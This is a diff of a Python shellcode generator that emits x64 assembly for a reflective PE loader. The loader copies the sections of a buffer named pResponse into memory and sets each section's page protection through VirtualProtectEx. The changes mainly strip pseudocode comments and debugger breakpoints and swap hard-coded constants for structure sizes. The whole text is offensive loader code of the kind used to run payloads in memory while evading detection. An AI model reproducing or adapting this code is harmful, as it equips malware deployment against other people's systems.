@@ -137,7 +137,6 @@ class Shellcode():
         """
 
         stub = f"""
-; PIMAGE_SECTION_HEADER lpSectionHeaderArray = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pResponse + lpDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
 get_lpSectionHeaderArray:
     xor r11, r11
     mov rdx, [rbp - {self.storage_offsets['pResponse']}]
@@ -147,16 +146,12 @@ get_lpSectionHeaderArray:
     mov rcx, [rbp - {self.storage_offsets['pResponse']}]
     add rcx, rdx
     add rcx, {ctypes.sizeof(winnt._IMAGE_NT_HEADERS64)}
-    mov [rbp - {self.storage_offsets['lpSectionHeaderArray']}], rcx ; bu 00000240`19a506de "da rcx ; g"
+    mov [rbp - {self.storage_offsets['lpSectionHeaderArray']}], rcx
 
-; for (DWORD dwSecIndex = 0; dwSecIndex < lpNtHeader->FileHeader.NumberOfSections; dwSecIndex++, lpSectionHeaderArray++)
 init_dwSecIndex:
     xor rax, rax
     mov [rbp - {self.storage_offsets['dwSecIndex']}], rax
 
-; RAX => memcpy(void *dest,      // RCX => (LPVOID)((ULONGLONG)lpvLoadedAddress + lpSectionHeaderArray->VirtualAddress),
-;               const void *src, // RDX => (LPCVOID)((DWORD_PTR)pResponse + lpSectionHeaderArray->PointerToRawData)
-;               size_t count);   // R8  => lpSectionHeaderArray->SizeOfRawData
 copy_section:
     mov rax, [rbp - {self.storage_offsets['dwSecIndex']}]   
     xor r11, r11
@@ -177,15 +172,8 @@ copy_section:
     add rdx, r14
     mov r8, r13
     mov rax, [rbp - {self.storage_offsets['memcpy']}]
-    call rax ; bu 00000214`c27106da ".printf \"memcpy(%p, %p, %p)\\n\", rcx, rdx, r8 ; g"
+    call rax
 
-; DWORD dwSectionMappedSize = 0;
-; if (dwSecIndex == lpNtHeader->FileHeader.NumberOfSections - 1) {{
-;     dwSectionMappedSize = lpNtHeader->OptionalHeader.SizeOfImage - lpSectionHeaderArray->VirtualAddress;
-; }}
-; else {{
-;     dwSectionMappedSize = lpSectionHeaderArray[1].VirtualAddress - lpSectionHeaderArray->VirtualAddress;
-; }}
 get_mapped_section_size:
     xor rax, rax
     mov [rbp - {self.storage_offsets['dwSectionMappedSize']}], rax
@@ -214,8 +202,7 @@ last_section:
 next_section:
     xor r11, r11
     mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
-    add rdx, 0x28 ; da rdx (0x28 == sizeof(winnt._IMAGE_SECTION_HEADER))
-
+    add rdx, {ctypes.sizeof(winnt._IMAGE_SECTION_HEADER)}
     add rdx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
     mov r11d, [rdx]
     xor r12, r12
@@ -225,11 +212,6 @@ next_section:
     sub r11, r12
     mov [rbp - {self.storage_offsets['dwSectionMappedSize']}], r11
 
-; if ((lpSectionHeaderArray->Characteristics & winnt.IMAGE_SCN_MEM_EXECUTE) &&
-;     (lpSectionHeaderArray->Characteristics & winnt.IMAGE_SCN_MEM_READ) &&
-;     (lpSectionHeaderArray->Characteristics & winnt.IMAGE_SCN_MEM_WRITE)) {{
-;     dwSectionProtection = winnt.PAGE_EXECUTE_READWRITE;
-; }}
 page_execute_read_write:  
     xor r11, r11
     mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
@@ -248,10 +230,6 @@ page_execute_read_write:
     mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
     jmp change_perm
 
-; else if ((lpSectionHeaderArray->Characteristics & winnt.IMAGE_SCN_MEM_EXECUTE) &&
-;          (lpSectionHeaderArray->Characteristics & winnt.IMAGE_SCN_MEM_READ)) {{
-;     dwSectionProtection = winnt.PAGE_EXECUTE_READ;
-; }}
 page_execute_read:
     mov r12, r11
     and r12d, {winnt.IMAGE_SCN_MEM_EXECUTE}
@@ -263,10 +241,6 @@ page_execute_read:
     mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
     jmp change_perm
 
-; else if ((lpSectionHeaderArray->Characteristics & winnt.IMAGE_SCN_MEM_EXECUTE) &&
-;          (lpSectionHeaderArray->Characteristics & winnt.IMAGE_SCN_MEM_WRITE)) {{
-;     dwSectionProtection = winnt.PAGE_EXECUTE_WRITECOPY;
-; }}
 page_execute_writecopy:
     mov r12, r11
     and r12d, {winnt.IMAGE_SCN_MEM_EXECUTE}
@@ -278,10 +252,6 @@ page_execute_writecopy:
     mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
     jmp change_perm
 
-; else if ((lpSectionHeaderArray->Characteristics & winnt.IMAGE_SCN_MEM_READ) &&
-;          (lpSectionHeaderArray->Characteristics & winnt.IMAGE_SCN_MEM_WRITE)) {{
-;     dwSectionProtection = winnt.PAGE_READWRITE;
-; }}
 page_readwrite:
     mov r12, r11
     and r12d, {winnt.IMAGE_SCN_MEM_READ}
@@ -293,9 +263,6 @@ page_readwrite:
     mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
     jmp change_perm
 
-; else if (lpSectionHeaderArray->Characteristics & winnt.IMAGE_SCN_MEM_EXECUTE) {{
-;     dwSectionProtection = winnt.PAGE_EXECUTE;
-; }}
 page_execute:
     mov r12, r11
     and r12d, {winnt.IMAGE_SCN_MEM_EXECUTE}
@@ -305,9 +272,6 @@ page_execute:
 
     jmp change_perm
 
-; else if (lpSectionHeaderArray->Characteristics & winnt.IMAGE_SCN_MEM_READ) {{
-;     dwSectionProtection = winnt.PAGE_READONLY;
-; }}
 page_readonly:
     mov r12, r11
     and r12d, {winnt.IMAGE_SCN_MEM_READ}
@@ -316,9 +280,6 @@ page_readonly:
     mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
     jmp change_perm
 
-; else if (lpSectionHeaderArray->Characteristics & winnt.IMAGE_SCN_MEM_WRITE) {{
-;     dwSectionProtection = winnt.PAGE_WRITECOPY;
-; }}
 page_writecopy:
     mov r12, r11
     and r12d, {winnt.IMAGE_SCN_MEM_WRITE}
@@ -327,18 +288,10 @@ page_writecopy:
     mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
     jmp change_perm
 
-; else {{
-;     dwSectionProtection = winnt.PAGE_NOACCESS;
-; }}
 page_noaccess:
     mov r12, {winnt.PAGE_NOACCESS}
     mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
 
-; RAX => VirtualProtectEx([in]  HANDLE hProcess,        // RCX        => hProcess
-;                         [in]  LPVOID lpAddress,       // RDX        => (LPVOID)((ULONGLONG)lpvLoadedAddress + lpSectionHeaderArray->VirtualAddress)
-;                         [in]  SIZE_T dwSize,          // R8         => dwSectionMappedSize
-;                         [in]  DWORD  flNewProtect,    // R9         => dwSectionProtection
-;                         [out] PDWORD lpflOldProtect); // [RSP+0x20] => &dwOldProtect
 change_perm:
     xor r11, r11
     mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
@@ -361,7 +314,7 @@ check_next_section:
     inc cl
     mov [rbp - {self.storage_offsets['dwSecIndex']}], rcx
     mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
-    add rdx, 0x28
+    add rdx, {ctypes.sizeof(winnt._IMAGE_SECTION_HEADER)}
     mov [rbp - {self.storage_offsets['lpSectionHeaderArray']}], rdx
     xor r9, r9
     mov r8, [rbp - {self.storage_offsets['pNtHeader']}]
@@ -378,22 +331,16 @@ check_next_section:
         """
 
         stub = f"""
-; memcpy(lpvLoadedAddress, pResponse, lpNtHeader->OptionalHeader.SizeOfHeaders);
 copy_to_alloc:
     xor r8, r8
     mov rax, [rbp - {self.storage_offsets['memcpy']}]
-    mov rcx, [rbp - {self.storage_offsets['lpvLoadedAddress']}] ; was lpvLoadedAddress (TRIED: lpvLoadedAddress)
+    mov rcx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
     mov r11, [rbp - {self.storage_offsets['pNtHeader']}]
     add r11, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
     mov r8d, [r11 + {winnt._IMAGE_OPTIONAL_HEADER64.SizeOfHeaders.offset}]
     mov rdx, [rbp - {self.storage_offsets['pResponse']}]
     call rax
 
-; RAX = VirtualProtectEx([in]  HANDLE hProcess,        // RCX        => hProcess
-;                        [in]  LPVOID lpAddress,       // RDX        => lpvLoadedAddress
-;                        [in]  SIZE_T dwSize,          // R8         => lpNtHeader->OptionalHeader.SizeOfHeaders
-;                        [in]  DWORD  flNewProtect,    // R9         => winnt.PAGE_READONLY
-;                        [out] PDWORD lpflOldProtect); // [RSP+0x20] => NULL
 change_permissions:
     xor rdx, rdx
     mov r11, [rbp - {self.storage_offsets['pNtHeader']}]
@@ -406,7 +353,7 @@ change_permissions:
     add rsp, 0x28
     mov [rsp+0x20], r11
     mov rcx, [rbp - {self.storage_offsets['hProcess']}]
-    mov r9, 0x02
+    mov r9, {winnt.PAGE_READONLY}
     call rax
         """
 
